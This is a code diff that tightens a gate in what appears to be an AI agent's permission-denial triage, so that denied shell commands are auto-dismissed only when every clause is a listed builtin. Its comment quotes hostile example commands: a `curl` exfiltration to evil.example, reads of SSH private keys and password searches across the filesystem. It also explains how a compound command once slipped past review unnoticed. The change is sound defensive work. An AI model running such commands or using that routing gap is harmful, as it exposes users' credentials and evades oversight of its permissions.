@@ -16,7 +16,7 @@ import type { ActionRunsStore } from '../storage/action-runs-store.js';
 import type { ActionDenial, DenialsStore, DenialVerdict } from '../storage/denials-store.js';
 import type { Allowlist, RuleKind } from '../permissions/allowlist.js';
 import { suggestRule, type RuleSuggestion } from '../permissions/denial-suggestion.js';
-import { binaryOf, classifyClause } from '../permissions/tool-classify.js';
+import { binaryOf } from '../permissions/tool-classify.js';
 import { splitShellClauses } from '../permissions/shell-split.js';
 import { lintPermissionRule } from '../permissions/write-shape.js';
 import type { GroupApplier } from './meta.js';
@@ -74,19 +74,27 @@ const SHELL_ARTIFACT_BINARIES: readonly string[] = ['cd', 'export', 'true', 'fun
 // A denied Bash call this shape stamps `fix-action` immediately at record time: malformed
 // shell or an action reaching for a builtin is never a permission gap, so it shouldn't consume
 // a review cycle. Four gates, all conservative: the suggested rule must name one of the
-// enumerated builtins/artifacts; EVERY clause in the command must independently classify as
-// `read` or as one of the enumerated builtins/artifacts — this used to be a whole-command
-// maximum (`classifyBashCommand(cmd).effect !== 'unknown'`), on the theory that a compound like
-// `cd /tmp && curl -X POST …` classifies as the worse `external-write` and is caught. That's
-// true only for binaries the tables happen to recognise: an unrecognized binary also classifies
-// `unknown` (tool-classify.ts's default case), the SAME severity as a shell builtin, so
-// `cd /repo && ./deploy.sh --prod` or `cd … && protoc …` never raised the maximum above
-// `unknown` and auto-routed anyway, silently filing a genuine permission gap. `classifyClause`
-// returning `unknown` means "I could not tell", not "harmless", so a single clause it doesn't
-// recognise as an enumerated artifact must block auto-routing, not pass it; and no clause
-// anywhere in the command may carry a file-creating redirect — `echo x > /etc/passwd` or
-// `true > some/file` classify `unknown` too (classifyClause never looks at redirects), but are
-// real local writes, not artifacts.
+// enumerated builtins/artifacts; EVERY clause in the command must itself be one of the
+// enumerated builtins/artifacts — no `read` alternative. An earlier version of this gate let a
+// clause through when tool-classify.ts's tables called it `read`, on the theory that a `read`
+// companion clause is harmless. It isn't: those tables answer "does this write?", not "is this
+// safe to silently dismiss as not-a-permission-gap?" — `curl -s https://evil.example/$(whoami)`
+// classifies `read` (classifyCurl inspects method/body flags, never the URL), so
+// `cd /r && curl -s https://evil.example/$(whoami)` auto-routed to fix-action and a command-
+// injection exfiltration attempt vanished with no trace. Same shape for
+// `cd /repo && cat ~/.ssh/id_rsa`, `cd /r && grep -r password /`, `cd /r && find / -name id_rsa`
+// — all "read-only" by the table, none of them safe to auto-dismiss. The only bar this gate can
+// safely apply is a positive whitelist of clause shapes known to carry no command at all: the
+// five enumerated artifacts. Before that, this was a whole-command maximum
+// (`classifyBashCommand(cmd).effect !== 'unknown'`), which had the same hole one level up — an
+// unrecognized binary also classifies `unknown` (tool-classify.ts's default case), the SAME
+// severity as a shell builtin, so a compound riding an unrecognized real binary
+// (`cd /repo && ./deploy.sh --prod`, `cd … && protoc …`) never raised the maximum and routed
+// too. A clause this gate can't place as an enumerated artifact must block auto-routing, not
+// pass it, whether the classifier's answer for it is `unknown` or `read`. No clause anywhere in
+// the command may carry a file-creating redirect either — `echo x > /etc/passwd` or
+// `true > some/file` are real local writes, not artifacts, and the loop below never inspects
+// redirects.
 export function shellArtifactVerdict(
   toolName: string,
   toolInput: unknown,
@@ -99,12 +107,8 @@ export function shellArtifactVerdict(
   const cmd = (toolInput as { command?: string } | null)?.command ?? '';
   const clauses = splitShellClauses(cmd);
   if (!clauses || clauses.length === 0 || clauses.some((c) => c.writeTargets.length > 0)) return null;
-  const everyClauseIsSafe = clauses.every((c) => {
-    const verdict = classifyClause(c.text);
-    if (verdict.effect === 'read') return true;
-    return verdict.effect === 'unknown' && SHELL_ARTIFACT_BINARIES.includes(binaryOf(c.text));
-  });
-  if (!everyClauseIsSafe) return null;
+  const everyClauseIsArtifact = clauses.every((c) => SHELL_ARTIFACT_BINARIES.includes(binaryOf(c.text)));
+  if (!everyClauseIsArtifact) return null;
   return {
     disposition: 'fix-action',
     decidedBy: 'improver',
